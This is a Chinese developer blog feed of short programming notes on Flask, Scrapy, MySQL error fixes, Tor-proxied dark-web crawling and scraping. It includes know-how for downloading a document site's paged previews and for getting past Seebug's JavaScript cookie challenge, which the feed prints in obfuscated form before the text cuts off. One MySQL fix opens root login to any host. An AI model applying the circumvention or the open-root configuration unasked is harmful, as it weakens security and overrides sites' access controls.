class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends &quot;bootstrap&#x2F;base.html&quot;  %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block head %&#125;</span><br><span class="line">    &#123;&#123; super() &#125;&#125;</span><br><span class="line">    &lt;link href&#x3D;&quot;&#x2F;css&#x2F;bootstrap-datepicker.standalone.min.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block scripts %&#125;</span><br><span class="line">    &#123;&#123; super() &#125;&#125;</span><br><span class="line"></span><br><span class="line">    &lt;script src&#x3D;&quot;&#x2F;js&#x2F;bootstrap-datepicker.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">    &lt;script src&#x3D;&quot;&#x2F;locales&#x2F;bootstrap-datepicker.zh-CN.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">    &lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">    $(&#39;.input-daterange&#39;).datepicker(&#123;</span><br><span class="line">        format: &quot;yyyy-mm-dd&quot;</span><br><span class="line">    &#125;);</span><br><span class="line">    &lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block title %&#125;datepicker&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;% block content %&#125;</span><br><span class="line"></span><br><span class="line">&lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class="line">  &#123;% block page_content %&#125;</span><br><span class="line">       &lt;form action&#x3D;&quot;&#x2F;&quot; style&#x3D;&quot;text-align: center;&quot;&gt;</span><br><span class="line">        &lt;div class&#x3D;&quot;input-daterange&quot; id&#x3D;&quot;datepicker&quot;&gt;</span><br><span class="line">            &lt;span&gt;查询日期：&lt;&#x2F;span&gt;</span><br><span class="line">            &lt;input type&#x3D;&quot;text&quot; class&#x3D;&quot;input-small&quot; name&#x3D;&quot;start&quot; &#x2F;&gt;</span><br><span class="line">            &lt;span&gt;至&lt;&#x2F;span&gt;</span><br><span class="line">            &lt;input type&#x3D;&quot;text&quot; class&#x3D;&quot;input-small&quot; name&#x3D;&quot;end&quot; &#x2F;&gt;</span><br><span class="line">            &lt;button type&#x3D;&quot;submit&quot; value&#x3D;&quot;查询&quot;&gt;查询&lt;&#x2F;button&gt;</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line">起&#123;&#123;start&#125;&#125;</span><br><span class="line">止&#123;&#123;end&#125;&#125;</span><br><span class="line">  &#123;% endblock %&#125;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>原创力文档爬取</title>
      <link href="2020/04/10/2020-04-10-yuanchuangli_document_crawl/"/>
      <url>2020/04/10/2020-04-10-yuanchuangli_document_crawl/</url>
      
        <content type="html"><![CDATA[<h2 id="原创力文档爬取"><a href="#原创力文档爬取" class="headerlink" title="原创力文档爬取"></a>原创力文档爬取</h2><p>该网站的文档提供了全屏预览功能，每次通过getPreview加载6页文档图片，获取json数据包并下载全部图片即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">def download_pdf():</span><br><span class="line">    page &#x3D; &#123;&#125;</span><br><span class="line">    for i in range(1,68,6):</span><br><span class="line">        url &#x3D; &#39;https:&#x2F;&#x2F;openapi.book118.com&#x2F;getPreview.html?&amp;project_id&#x3D;1&amp;aid&#x3D;188566573&amp;view_token&#x3D;oRsDRPA2fRmTunsA6MLhqF9PReffveqn&amp;aid_encode&#x3D;8101111070001130&amp;page&#x3D;&#123;&#125;&amp;callback&#x3D;jQuery1710897339551141484_1586251783873&amp;_&#x3D;1586252051754&#39;.format(i)</span><br><span class="line">        data &#x3D; requests.get(url).text</span><br><span class="line">        print(data)</span><br><span class="line">        data &#x3D; data.replace(&#39;jQuery1710897339551141484_1586251783873(&#39;,&#39;&#39;).replace(&#39;);&#39;,&#39;&#39;)</span><br><span class="line">        data &#x3D; json.loads(data,strict&#x3D;False)</span><br><span class="line">        data &#x3D; data[&#39;data&#39;]</span><br><span class="line">        Merge(data,page)</span><br><span class="line">        time.sleep(3)</span><br><span class="line">    print(page)</span><br><span class="line">    for key,value in page.items():</span><br><span class="line">        r &#x3D; requests.get(&#39;https:&#39;+value)</span><br><span class="line">        with open(key+&#39;.png&#39;, &#39;wb&#39;) as f:</span><br><span class="line">            f.write(r.content)</span><br><span class="line"></span><br><span class="line">def Merge(dict1, dict2):</span><br><span class="line">    return(dict2.update(dict1))</span><br><span class="line"></span><br><span class="line">download_pdf()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Scrapy 单个爬虫自定义设置</title>
      <link href="2020/04/09/2020-04-09-scrapy_single_crawler_custom_settings/"/>
      <url>2020/04/09/2020-04-09-scrapy_single_crawler_custom_settings/</url>
      
        <content type="html"><![CDATA[<h2 id="Scrapy-单个爬虫自定义设置"><a href="#Scrapy-单个爬虫自定义设置" class="headerlink" title="Scrapy 单个爬虫自定义设置"></a>Scrapy 单个爬虫自定义设置</h2><p>比如有project1，和project2两个网站要爬取，第一个网站已经使用了settings中的配置，那么project2的配置需要在project2.py中自定义，放到custom_settings 这个字典里：</p><pre><code> custom_settings = &#123;    &#39;ITEM_PIPELINES&#39;:&#123;&#39;quotetutorial.pipelines.MongoPipeline&#39;: 400,&#125;,        &#39;DEFAULT_REQUEST_HEADERS&#39;:&#123;            &#39;User-Agent&#39;: &#39;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)&#39;,            &#39;Accept-Encoding&#39;: &#39;gzip,deflate&#39;,            &#39;Accept-Language&#39;: &#39;zh-cn,zh,en&#39;        &#125;    &#125;</code></pre><p>注意：在这里的custom_settings 中有设置的参数，才会生效，如果没有设置，就默认采用settings中设置的；如果settings和这里的custom_settings 同时对一个参数进行设置，那么project2运行时，只会默认custom_settings中设置的参数。</p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> scrapy </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql 1130错误 无法远程连接</title>
      <link href="2020/04/08/2020-04-08-mysql_1130_error_cannot_connect_remotely/"/>
      <url>2020/04/08/2020-04-08-mysql_1130_error_cannot_connect_remotely/</url>
      
        <content type="html"><![CDATA[<h2 id="Mysql-1130错误-无法远程连接"><a href="#Mysql-1130错误-无法远程连接" class="headerlink" title="Mysql 1130错误 无法远程连接"></a>Mysql 1130错误 无法远程连接</h2><p><strong>错误</strong>：ERROR 1130: Host ‘192.168.1.3’ is not allowed to connect to thisMySQL serve</p><p><strong>原因</strong>：被连接的数据不允许使用 192.168.1.3访问，只允许是用 localhost</p><p><strong>解决办法</strong>:可能是你的帐号不允许从远程登陆，只能在localhost。这个时候只要在localhost的那台电脑，登入mysql后，更改”mysql” 数据库里的 “user” 表里的 “host”项，从”localhost”改称”%”</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p</span><br><span class="line">mysql&gt;use mysql;</span><br><span class="line">mysql&gt;select &#39;host&#39; from user where user&#x3D;&#39;root&#39;;</span><br><span class="line">mysql&gt;update user set host &#x3D; &#39;%&#39; where user &#x3D;&#39;root&#39;;</span><br><span class="line">mysql&gt;flush privileges;</span><br><span class="line">mysql&gt;select &#39;host&#39;   from user where user&#x3D;&#39;root&#39;;</span><br></pre></td></tr></table></figure><p>再检查进程实际监听地址</p><p>修改/etc/mysql/mysql.conf.d/mysqld.cnf或/etc/mysql/my.conf路径下的bind-address参数（前面两个路径为不同版本下的配置文件所在位置）</p><p>将其中的bind-address=127.0.0.1改为bind-address=0.0.0.0，再重启mysql服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;init.d&#x2F;mysql restart</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql 2059错误 修改加密规则</title>
      <link href="2020/04/07/2020-04-07-mysql_2059_error_Modify_encryption_rules/"/>
      <url>2020/04/07/2020-04-07-mysql_2059_error_Modify_encryption_rules/</url>
      
        <content type="html"><![CDATA[<h2 id="Mysql-2059错误-修改加密规则"><a href="#Mysql-2059错误-修改加密规则" class="headerlink" title="Mysql 2059错误 修改加密规则"></a>Mysql 2059错误 修改加密规则</h2><h4 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql8 之前的版本中加密规则是mysql_native_password,而在mysql8之后,加密规则是caching_sha2_password</span><br></pre></td></tr></table></figure><h4 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h4><p>更改加密规则：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -ppassword #登录</span><br><span class="line"></span><br><span class="line">use mysql; #选择数据库</span><br><span class="line"># 远程连接请将&#39;localhost&#39;换成&#39;%&#39;</span><br><span class="line"></span><br><span class="line">ALTER USER &#39;root&#39;@&#39;localhost&#39; IDENTIFIED BY &#39;password&#39; PASSWORD EXPIRE NEVER; #更改加密方式</span><br><span class="line"></span><br><span class="line">ALTER USER &#39;root&#39;@&#39;localhost&#39; IDENTIFIED WITH mysql_native_password BY &#39;password&#39;; #更新用户密码</span><br><span class="line"></span><br><span class="line">FLUSH PRIVILEGES; #刷新权限</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql 1040错误 最大连接数问题</title>
      <link href="2020/04/06/2020-04-06-mysql_1040_error_Maximum_number_of_connections/"/>
      <url>2020/04/06/2020-04-06-mysql_1040_error_Maximum_number_of_connections/</url>
      
        <content type="html"><![CDATA[<h2 id="Mysql-1040错误-最大连接数问题"><a href="#Mysql-1040错误-最大连接数问题" class="headerlink" title="Mysql 1040错误 最大连接数问题"></a>Mysql 1040错误 最大连接数问题</h2><p>pymysql.err.OperationalError: (1040, ‘Too many connections’) 超出连接数据库最大连接数所致，修改最大连接数。</p><p>查看数据库当前运行状态：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show status like &#39;Threads%&#39;;</span><br><span class="line">  +-------------------+-------+</span><br><span class="line">  | Variable_name     | Value |</span><br><span class="line">  +-------------------+-------+</span><br><span class="line">  | Threads_cached    | 58    |</span><br><span class="line">  | Threads_connected | 57    |   ###这个数值指的是打开的连接数</span><br><span class="line">  | Threads_created   | 3676  |</span><br><span class="line">  | Threads_running   | 4     |   ###这个数值指的是激活的连接数，这个数值一般远低于connected数值</span><br></pre></td></tr></table></figure><p>查询数据库当前设置的<strong>系统支持的最大连接max_connections</strong>,<strong>用户能最大连接进来的数量max_user_connections</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show variables like &#39;max%connections&#39;;</span><br><span class="line">+----------------------+-------+</span><br><span class="line">| Variable_name        | Value |</span><br><span class="line">+----------------------+-------+</span><br><span class="line">| max_connections      | 2000  |</span><br><span class="line">| max_user_connections | 1500  |</span><br><span class="line">+----------------------+-------+</span><br></pre></td></tr></table></figure><p>在/etc/my.cnf里面设置数据库的最大连接数,别忘记在配置文件里添加否则重启失效</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[mysqld]</span><br><span class="line">max_connections&#x3D;1000</span><br><span class="line">max_user_connection&#x3D;600</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ubuntu 中 Typora  安装</title>
      <link href="2020/04/05/2020-04-05-ubuntu_install_Typora/"/>
      <url>2020/04/05/2020-04-05-ubuntu_install_Typora/</url>
      
        <content type="html"><![CDATA[<h2 id="ubuntu-中-Typora-安装"><a href="#ubuntu-中-Typora-安装" class="headerlink" title="ubuntu 中 Typora  安装"></a>ubuntu 中 Typora  安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># optional, but recommended</span><br><span class="line"></span><br><span class="line">sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys BA300B7755AFCFAE</span><br><span class="line"></span><br><span class="line"># add Typora&#39;s repository</span><br><span class="line"></span><br><span class="line">sudo add-apt-repository &#39;deb http:&#x2F;&#x2F;typora.io linux&#x2F;&#39;</span><br><span class="line"></span><br><span class="line">sudo apt-get update</span><br><span class="line"></span><br><span class="line"># install typora</span><br><span class="line"></span><br><span class="line">sudo apt-get install typora</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ubuntu </tag>
            
            <tag> typora </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>scrapy爬虫入门（四） 爬取携带cookie、headers、proxy</title>
      <link href="2020/04/04/2020-04-04-scrapy_spiders_crawl_with_cookie_headers_proxy/"/>
      <url>2020/04/04/2020-04-04-scrapy_spiders_crawl_with_cookie_headers_proxy/</url>
      
        <content type="html"><![CDATA[<h1 id="scrapy如何携带cookie、headers、proxy进行爬取"><a href="#scrapy如何携带cookie、headers、proxy进行爬取" class="headerlink" title="scrapy如何携带cookie、headers、proxy进行爬取"></a>scrapy如何携带cookie、headers、proxy进行爬取</h1><p>对于一些简单网页的爬取，可能不需要这些操作。但一些复杂的网页，比如具有反爬策略的网站，胡检查你头部的referer等属性，此时需要添加headers再爬取；再比如需要模拟登陆的网站，则需要添加cookie再爬取；需要添加代理爬取时，则要添加Proxy。</p><p>这些参数都可以在settings中设置，但在settings中设置，是针对项目中的所有爬虫。而一般来说，对于爬取不同网页，有不同的需求。我们往往在单个爬虫中设置这些参数。</p><p>一般写在爬虫初始部分，然后改写start_requests调用。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start_requests</span>(<span class="params">self</span>):</span></span><br><span class="line">    <span class="keyword">yield</span> scrapy.Request(url=self.start_urls[<span class="number">0</span>], headers=headers,cookies = cookies,meta=&#123;<span class="string">&#x27;proxy&#x27;</span>:<span class="string">&#x27;http://127.0.0.1:8118&#x27;</span>&#125;,callback=self.parse)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> scrapy </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>flask传递数据</title>
      <link href="2020/04/03/2020-04-03-flask_pass_data/"/>
      <url>2020/04/03/2020-04-03-flask_pass_data/</url>
      
        <content type="html"><![CDATA[<p>课题需要在flask web前端输入日期，后台查询显示。由于自己是web小白，flask也是初学，自己通过一个方法实现了这个功能，记录一下。</p><p><strong>方法：</strong></p><p>前端提供表单input数据，回传给flask。flask.request接受数据并查询。</p><p><strong>实现：</strong></p><p>1.jinja模板中添加表单</p><pre><code>&lt;form action=&quot;/clearnewslist&quot; style=&quot;text-align: center;&quot;&gt;    查询日期:    &lt;input type=&quot;text&quot; name=&quot;query_date&quot; pattern=&quot;[0-9]&#123;4&#125;-[0-9]&#123;2&#125;-[0-9]&#123;2&#125;&quot; placeholder=&quot;xxxx-xx-xx&quot; maxlength=10&gt;    &lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt;&lt;/form&gt;</code></pre><p>其中input属性，pattern匹配正则，规定输入字段的值的模式或格式；placeholder 规定帮助用户填写输入字段的提示；maxlength规定输入字段中的字符的最大长度。</p><p>2.后台接收get请求</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">date &#x3D; request.args.get(&#39;query_date&#39;)</span><br></pre></td></tr></table></figure><p>3.调用自己的查询接口，并将查询数据返回给前端</p><p><strong>PS：request 也可接收post，put请求</strong></p><p>使用request.get_json()接收传递过来的所有数据<br>根据传的json的值，返回的结果可以使字典类型，也可能是列表<br>传入的json的值是key:value,如{“key”:“value”}，则返回的结果是字典类型<br>传入的json的值是[“value1”,“value2”,“value3”]，则返回的结果是列表类型</p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> flask </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>scrapy两条链路分别爬取明暗网数据</title>
      <link href="2020/04/03/2020-04-03-scrapy_two_ways_crawl_clear_dark_web/"/>
      <url>2020/04/03/2020-04-03-scrapy_two_ways_crawl_clear_dark_web/</url>
      
        <content type="html"><![CDATA[<h2 id="scrapy两条链路分别爬取明暗网数据"><a href="#scrapy两条链路分别爬取明暗网数据" class="headerlink" title="scrapy两条链路分别爬取明暗网数据"></a>scrapy两条链路分别爬取明暗网数据</h2><p>最近更改了爬虫框架和数据库结构，可以明暗网在同一环境中同时爬取，记录如下。</p><p>1.首先搭建好暗网环境。</p><p>其中privoxy设置将8118端口转到Tor的9050端口，Tor转到vps的1080端口。</p><p>2.对于明网：不用额外操作，不需配置代理，直接爬取。</p><p>对于暗网：在爬取解析时，需要携带一个proxy，方式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def start_requests(self):</span><br><span class="line">    yield scrapy.Request(url&#x3D;self.start_urls[0], meta&#x3D;&#123;&#39;proxy&#39;:&#39;http:&#x2F;&#x2F;127.0.0.1:8118&#39;&#125;,callback&#x3D;self.parse)</span><br></pre></td></tr></table></figure><p>主要是改写start_requests添加8118端口的代理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meta&#x3D;&#123;&#39;proxy&#39;:&#39;http:&#x2F;&#x2F;127.0.0.1:8118&#39;&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> scrapy </tag>
            
            <tag> 爬虫 </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>知道创宇反爬策略 已解决</title>
      <link href="2020/04/02/2020-04-02-seebug_anti-crawl/"/>
      <url>2020/04/02/2020-04-02-seebug_anti-crawl/</url>
      
        <content type="html"><![CDATA[<h1 id="破解知道创宇seebug漏洞平台反爬策略"><a href="#破解知道创宇seebug漏洞平台反爬策略" class="headerlink" title="破解知道创宇seebug漏洞平台反爬策略"></a>破解知道创宇seebug漏洞平台反爬策略</h1><p>课题需要，爬取知道创宇seebug漏洞平台漏洞，但爬取发现无数据。研究了一天，发现是利用js添加了额外cookie值，现将解决过程记录如下。</p><h4 id="1-requests请求网站"><a href="#1-requests请求网站" class="headerlink" title="1.requests请求网站"></a>1.requests请求网站</h4><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424004625.PNG" alt="seebug  返回521及内容"></p><p>发现返回521错误这个错误之前没遇到过，返回的是以下内容。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="keyword">var</span> x=<span class="string">&quot;firstChild@onreadystatechange@__p@02@@@@window@@@innerHTML@@@g@GMT@attachEvent@@4@@@document@setTimeout@pathname@try@Ss@@@@@var@rOm9XFMtA3QKV7nYsPGT4lifyWwkq5vcjH2IdxUoCbhERLaz81DNB6@@function@e@@captcha@@@36@@3@@1585820033@return@@l@reverse@false@search@@33@d@1500@8@0@DOMContentLoaded@@length@0xFF@@10@@Apr@477@o@f@@replace@https@@@as@@5@href@for@String@charAt@split@charCodeAt@@else@Path@@53@2@RegExp@toLowerCase@Expires@location@Array@20@0xEDB88320@new@@join@while@JgSe0upZ@@@__jsl_clearance@challenge@Thu@@@a@@addEventListener@parseInt@G@toString@1@NO@@hantom@createElement@substr@match@cookie@fromCharCode@catch@@chars@eval@div@@@if&quot;</span>.replace(<span class="regexp">/@*$/</span>,<span class="string">&quot;&quot;</span>).split(<span class="string">&quot;@&quot;</span>),y=<span class="string">&quot;19 50=1c()&#123;11(&#x27;46.3c=46.12+46.27.35(/[\\?|&amp;]1f-4i/,\\&#x27;\\&#x27;)&#x27;,2b);10.5e=&#x27;4h=21.31|2d|&#x27;+(1c()&#123;19 6=[1c(50)&#123;22 50&#125;,1c(6)&#123;22 6&#125;,1c(50)&#123;22 5j(&#x27;3e.5f(&#x27;+50+&#x27;)&#x27;)&#125;],1j=[(-~~~&#x27;&#x27;+[]+[])+[-~&#123;&#125;+(-~&#123;&#125;+[~~&#x27;&#x27;])/[-~&#123;&#125;-~&#123;&#125;]],[(-~&#123;&#125;+[~~&#x27;&#x27;])/[42]],[-~(+!-[])]+(((+!-[])|-~&#123;&#125;-~&#123;&#125;)+[]+[]),(~~&#123;&#125;+[]+[]),(-~&#123;&#125;-~&#123;&#125;+3b+[]),[-~(+!-[])]+(-~~~&#x27;&#x27;+[]+[]),(-~~~&#x27;&#x27;+[]+[])+[-~(+!-[])],[i-~(+!-[])-~[-~&#123;&#125;-~&#123;&#125;]],(-~~~&#x27;&#x27;+[]+[])+[i-~(+!-[])-~[-~&#123;&#125;-~&#123;&#125;]],(((+!-[])|-~&#123;&#125;-~&#123;&#125;)+[]+[]),(-~~~&#x27;&#x27;+[]+[])+(((+!-[])|-~&#123;&#125;-~&#123;&#125;)+[]+[]),(-~~~&#x27;&#x27;+[]+[])+[-~((-~~~&#x27;&#x27;+[-~(+!-[])]&gt;&gt;-~(+!-[])))],[-~(+!-[])]+[-~(+!-[])],[-~(+!-[])]+[-~&#123;&#125;+(-~&#123;&#125;+[~~&#x27;&#x27;])/[-~&#123;&#125;-~&#123;&#125;]],(-~~~&#x27;&#x27;+[]+[])+(2c+[]),[-~&#123;&#125;+(-~&#123;&#125;+[~~&#x27;&#x27;])/[-~&#123;&#125;-~&#123;&#125;]],[-~(+!-[])]+(~~&#123;&#125;+[]+[]),(-~~~&#x27;&#x27;+[]+[])+(-~~~&#x27;&#x27;+[]+[]),[-~(+!-[])]+[-~((-~~~&#x27;&#x27;+[-~(+!-[])]&gt;&gt;-~(+!-[])))],[-~((-~~~&#x27;&#x27;+[-~(+!-[])]&gt;&gt;-~(+!-[])))],(-~~~&#x27;&#x27;+[]+[])+[(-~&#123;&#125;+[~~&#x27;&#x27;])/[42]],(-~~~&#x27;&#x27;+[]+[])+(-~&#123;&#125;-~&#123;&#125;+3b+[]),(-~~~&#x27;&#x27;+[]+[])+(~~&#123;&#125;+[]+[]),(-~~~&#x27;&#x27;+[]+[]),[-~(+!-[])]+[(-~&#123;&#125;+[~~&#x27;&#x27;])/[42]],(2c+[]),[-~(+!-[])]];3d(19 50=2d;50&lt;1j.2g;50++)&#123;1j[50]=6[[57,2d,57,2d,57,42,57,2d,42,2d,42,2d,57,2d,42,57,42,57,2d,57,42,2d,57,2d,42,2d,42][50]]([(!-&#123;&#125;+[]+[]).3f(-~(+!-[])),(~~&#123;&#125;+[]+[]),[[-~&#123;&#125;+(-~&#123;&#125;+[~~&#x27;&#x27;])/[-~&#123;&#125;-~&#123;&#125;]]+(2c+[])],[(+!/!/)/(+!/!/)+[]+[]][2d].3f((-~~~&#x27;&#x27;&lt;&lt;-~~~&#x27;&#x27;))+[-~&#123;&#125;+(-~&#123;&#125;+[~~&#x27;&#x27;])/[-~&#123;&#125;-~&#123;&#125;]],&#x27;55&#x27;,[i-~(+!-[])-~[-~&#123;&#125;-~&#123;&#125;]],&#x27;42&#x27;,&#x27;58&#x27;,(((+!-[])|-~&#123;&#125;-~&#123;&#125;)+[]+[]),[&#123;&#125;+[[]][2d]][2d].3f((-~(+!-[])&lt;&lt;-~(+!-[]))),&#x27;2d&#x27;,&#x27;14&#x27;,&#x27;32&#x27;,[(2c+[])+[i-~(+!-[])-~[-~&#123;&#125;-~&#123;&#125;]]],(!-&#123;&#125;+[]+[]).3f(-~(+!-[])),[(-~~~&#x27;&#x27;+[]+[])+(~~&#123;&#125;+[]+[])+(((+!-[])|-~&#123;&#125;-~&#123;&#125;)+[]+[])],&#x27;1k&#x27;,[(-~&#123;&#125;+[~~&#x27;&#x27;])/[42]]+[(+!-[])/~~[]+[]+[]][2d].3f(-~!!8[&#x27;3&#x27;+&#x27;5a&#x27;+&#x27;39&#x27;]),[(((+!-[])|-~&#123;&#125;-~&#123;&#125;)+[]+[])+(-~&#123;&#125;-~&#123;&#125;+3b+[])],[(-~~~&#x27;&#x27;+[]+[])+(-~~~&#x27;&#x27;+[]+[])+(2c+[])],[(-~&#123;&#125;-~&#123;&#125;+3b+[])+(~~&#123;&#125;+[]+[]),(-~~~&#x27;&#x27;+[]+[])+(~~&#123;&#125;+[]+[])+[i-~(+!-[])-~[-~&#123;&#125;-~&#123;&#125;]]],[(-~&#123;&#125;-~&#123;&#125;+3b+[])+[(-~&#123;&#125;+[~~&#x27;&#x27;])/[42]]],&#x27;1k&#x27;,&#x27;24&#x27;,[!!8[&#x27;3&#x27;+&#x27;5a&#x27;+&#x27;39&#x27;]+[]+[]][2d].3f(((+!-[])|-~&#123;&#125;-~&#123;&#125;)),[(((+!-[])|-~&#123;&#125;-~&#123;&#125;)+[]+[])+(-~&#123;&#125;-~&#123;&#125;+3b+[])],[&#123;&#125;+[[]][2d]][2d].3f((-~(+!-[])&lt;&lt;-~(+!-[])))][1j[50]])&#125;;22 1j.4c(&#x27;&#x27;)&#125;)()+&#x27;;45=4j, 4-30-48 2j:29:41 f;3k=/;&#x27;&#125;;62((1c()&#123;13&#123;22 !!8.53;&#125;5g(1d)&#123;22 